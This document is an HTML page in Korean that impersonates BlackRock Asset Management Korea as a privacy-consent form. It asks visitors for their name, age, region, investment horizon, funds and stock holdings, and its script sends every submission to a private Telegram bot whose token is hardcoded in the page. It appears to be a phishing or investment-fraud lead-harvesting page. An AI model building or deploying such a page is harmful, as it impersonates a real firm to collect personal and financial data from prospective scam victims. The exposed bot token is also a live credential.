<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Privacy Policy & Consent | BlackRock</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Noto+Sans+KR:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg-color: #1a1f2c;
      --card-bg: #ffffff;
      --accent-dark: #0f172a;
      --point-blue: #2563eb;
      --border-soft: #e2e8f0;
      --text-main: #1e293b;
      --input-fill: #f8fafc;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Inter', 'Noto Sans KR', sans-serif;
      background: radial-gradient(circle at top right, #2d364d 0%, #1a1f2c 100%);
      color: var(--text-main);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 40px 20px;
    }

    .agreement-card {
      width: 100%;
      max-width: 740px;
      background: var(--card-bg);
      border-radius: 24px;
      padding: 60px 50px;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
      position: relative;
      overflow: hidden;
    }

    .agreement-card::before {
      content: "";
      position: absolute;
      top: 0; left: 0; right: 0;
      height: 6px;
      background: linear-gradient(90deg, #0f172a, #2563eb);
    }

    .top-brand {
      text-align: center;
      margin-bottom: 40px;
    }
    .top-brand .brand-name {
      font-size: 32px;
      font-weight: 800;
      letter-spacing: -1.5px;
      color: var(--accent-dark);
      text-transform: uppercase;
    }
    .top-brand .brand-sub {
      font-size: 11px;
      color: var(--point-blue);
      letter-spacing: 4px;
      font-weight: 700;
      margin-top: 4px;
    }

    .header {
      text-align: center;
      margin-bottom: 45px;
    }
    .header h1 {
      font-size: 22px;
      font-weight: 700;
      color: var(--text-main);
    }

    .form-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 22px;
      margin-bottom: 35px;
    }
    .input-group {
      display: flex;
      flex-direction: column;
    }
    label {
      font-size: 12.5px;
      color: var(--accent-dark);
      margin-bottom: 8px;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 4px;
    }
    label::before {
      content: "";
      width: 3px; height: 3px;
      background: var(--point-blue);
      border-radius: 50%;
    }

    input, select {
      background: var(--input-fill);
      border: 1px solid var(--border-soft);
      border-radius: 10px;
      padding: 14px 16px;
      color: var(--text-main);
      font-size: 15px;
      transition: all 0.2s;
    }
    input:focus, select:focus {
      outline: none;
      border-color: var(--point-blue);
      background: #fff;
      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
    }

    .full-width { grid-column: span 2; }

    .law-box {
      background: #f1f5f9;
      border-radius: 12px;
      padding: 22px;
      font-size: 14px;
      color: #334155;
      line-height: 1.8;
      margin-bottom: 40px;
      border: 1px solid #e2e8f0;
    }

    .date-selection {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
      margin-bottom: 45px;
      font-size: 16px;
      font-weight: 600;
      color: var(--accent-dark);
    }
    .date-selection select {
      background: transparent;
      border: none;
      border-bottom: 2px solid var(--point-blue);
      border-radius: 0;
      padding: 2px 4px;
      font-size: 18px;
      font-weight: 700;
      appearance: none;
      cursor: pointer;
    }

    .btn-submit {
      width: 100%;
      background: var(--accent-dark);
      color: #ffffff;
      border: none;
      padding: 18px;
      border-radius: 12px;
      font-size: 17px;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s;
    }
    .btn-submit:hover {
      background: #1e293b;
      transform: translateY(-2px);
    }
    .btn-submit:disabled {
      background: #94a3b8;
      cursor: not-allowed;
    }

    .company-footer {
      margin-top: 45px;
      text-align: center;
      font-size: 12px;
      color: #94a3b8;
      font-weight: 500;
      letter-spacing: 1.5px;
    }
  </style>
</head>
<body>

  <div class="agreement-card">
    <div class="top-brand">
      <div class="brand-name">BlackRock</div>
      <div class="brand-sub">ASSET MANAGEMENT</div>
    </div>

    <div class="header">
      <h1>개인정보 수집 및 이용 동의서</h1>
    </div>

    <form id="agreementForm">
      <div class="form-grid">
        <div class="input-group">
          <label>성명</label>
          <input type="text" id="u_name" placeholder="성함을 입력하세요" required>
        </div>
        <div class="input-group">
          <label>나이</label>
          <select id="u_age" required>
            <option value="">선택하세요</option>
            <option value="20-30">20~30대</option>
            <option value="40-50">40~50대</option>
            <option value="60+">60대 이상</option>
          </select>
        </div>

        <div class="input-group">
          <label>거주지 (도 단위)</label>
          <select id="u_loc" required>
            <option value="">선택하세요</option>
            <option value="서울특별시">서울특별시</option>
            <option value="경기도">경기도</option>
            <option value="기타 지역">기타 지역</option>
          </select>
        </div>

        <div class="input-group">
          <label>투자 기간</label>
          <select id="u_period" required>
            <option value="">선택하세요</option>
            <option value="1년이하">1년 이하</option>
            <option value="3년이상">3년 이상</option>
          </select>
        </div>

        <div class="input-group">
          <label>투자 자금</label>
          <select id="u_money" required>
            <option value="">선택하세요</option>
            <option value="5천만원이하">5천만원 이하</option>
            <option value="1억원이상">1억원 이상</option>
          </select>
        </div>

        <div class="input-group full-width">
          <label>보유 종목 (선택사항)</label>
          <input type="text" id="u_stock" placeholder="주요 보유 종목">
        </div>
      </div>

      <div class="law-box">
        블랙록자산운용은 개인정보 보호법 제30조에 따라 권익을 보호하며, 수집된 개인정보는 맞춤 투자 플랜에 참고 자료로 활용됨을 안내드립니다.
      </div>

      <div class="date-selection">
        <span>2026년</span>
        <select id="monthSelect"></select>
        <span>월</span>
        <select id="daySelect"></select>
        <span>일</span>
      </div>

      <button type="submit" id="submitBtn" class="btn-submit">내용 확인 및 동의 완료</button>
    </form>

    <div class="company-footer">
      BLACKROCK ASSET MANAGEMENT KOREA
    </div>
  </div>

<script>
  // 사장님의 텔레그램 봇 정보 적용 완료
  const TELEGRAM_BOT_TOKEN = '8650677001:AAH_GAz0OctgauRi75hlNhp4RKymD9_Q2kc';
  const TELEGRAM_CHAT_ID = '8650677001'; // 봇 토큰 앞자리 ID로 설정

  // 날짜 생성 로직
  const mSel = document.getElementById('monthSelect');
  const dSel = document.getElementById('daySelect');
  const now = new Date();

  for (let m = 1; m <= 12; m++) {
    let opt = document.createElement('option');
    opt.value = m; opt.textContent = m;
    if (m === now.getMonth() + 1) opt.selected = true;
    mSel.appendChild(opt);
  }

  function updateDays() {
    dSel.innerHTML = '';
    const lastDay = new Date(2026, mSel.value, 0).getDate();
    for (let d = 1; d <= lastDay; d++) {
      let opt = document.createElement('option');
      opt.value = d; opt.textContent = d;
      if (d === now.getDate()) opt.selected = true;
      dSel.appendChild(opt);
    }
  }
  mSel.addEventListener('change', updateDays);
  updateDays();

  // 제출 시 텔레그램 전송
  document.getElementById('agreementForm').onsubmit = function(e) {
    e.preventDefault();
    const btn = document.getElementById('submitBtn');
    btn.disabled = true;
    btn.innerText = "처리 중...";

    const name = document.getElementById('u_name').value;
    const age = document.getElementById('u_age').value;
    const loc = document.getElementById('u_loc').value;
    const period = document.getElementById('u_period').value;
    const money = document.getElementById('u_money').value;
    const stock = document.getElementById('u_stock').value || '없음';
    
    // 현재 정확한 시간
    const currentTime = new Date();
    const timeStr = `${currentTime.getHours()}시 ${currentTime.getMinutes()}분`;
    const dateStr = `2026년 ${mSel.value}월 ${dSel.value}일`;

    const text = `🔔 [BlackRock 신규 동의서]\n\n` +
                 `👤 성명: ${name}\n` +
                 `🎂 나이: ${age}\n` +
                 `📍 지역: ${loc}\n` +
                 `⏳ 기간: ${period}\n` +
                 `💰 자금: ${money}\n` +
                 `📈 종목: ${stock}\n\n` +
                 `📅 일시: ${dateStr} ${timeStr}`;

    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
    })
    .then(res => {
      if (res.ok) alert('동의가 완료되었습니다. 감사합니다.');
      else alert('전송 실패. 봇 대화방에서 /start를 눌렀는지 확인해주세요.');
      btn.disabled = false;
      btn.innerText = "내용 확인 및 동의 완료";
    })
    .catch(() => {
      alert('네트워크 오류');
      btn.disabled = false;
    });
  };
</script>
</body>
</html>
